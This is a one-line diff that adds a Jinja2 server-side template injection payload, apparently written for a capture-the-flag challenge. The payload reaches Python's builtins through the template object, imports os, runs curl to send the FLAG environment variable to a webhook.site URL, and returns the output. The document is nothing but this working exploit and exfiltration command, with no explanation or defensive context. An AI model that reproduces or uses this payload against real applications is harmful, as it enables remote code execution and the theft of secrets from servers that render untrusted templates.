@@ -1,0 +1,1 @@
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl https://webhook.site/814d88d4-070b-4509-b318-f28ee11642a0/?flag=' + self.__init__.__globals__.__builtins__.__import__('os').environ.get('FLAG')).read() }}
